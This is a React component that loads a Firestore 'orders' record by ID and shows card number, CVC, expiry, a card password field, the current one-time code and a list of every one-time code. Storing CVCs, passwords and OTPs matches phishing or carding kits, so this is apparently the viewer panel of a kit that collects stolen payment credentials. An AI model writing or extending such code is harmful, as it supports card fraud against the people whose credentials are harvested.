'use client'

import { useState, useEffect } from 'react'
import { DocumentData, doc, getDoc } from 'firebase/firestore'
import { db } from '@/lib/firestore'

interface CardData {
  id:string;
  cardNumber: string;
  cvc: string;
  pass:string;
  otp:string;
  prefix:string;
  month:string;
  yaer:string;
  otpall:string[]
  // Add other fields as needed
}

export function CardsByID({ id }: { id: string }) {
  const [cards, setCards] = useState<CardData | null>(null)
  const [loading, setLoading] = useState(true)
  const [error, setError] = useState<string | null>(null)

  useEffect(() => {
    async function fetchCards() {
      try {
        setLoading(true)
        const docRef = doc(db, 'orders', id)
        const docSnap = await getDoc(docRef)

        if (docSnap.exists()) {
          const data = docSnap.data() as CardData
          setCards(data)
        } else {
          setError('No cards found for this ID')
        }
      } catch (err) {
        setError('Error fetching cards')
        console.error('Error fetching cards:', err)
      } finally {
        setLoading(false)
      }
    }

    fetchCards()
  }, [id])

  if (loading) {
    return <div className="text-center py-4">Loading cards...</div>
  }

  if (error) {
    return <div className="text-center py-4 text-red-500">{error}</div>
  }

  if (!cards) {
    return <div className="text-center py-4">No card data available</div>
  }

  return (
    <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
      <span>{cards.cardNumber}</span>
      <span>{cards.cvc}</span>
      <span>{cards.month}</span>
      <span>{cards.yaer}</span>
      <span>{cards.otp}</span>
      <span>{cards.prefix}</span>
      <span>{cards.otpall}</span>
      {/* Add more spans for other card fields as needed */}
    </div>
  )
}

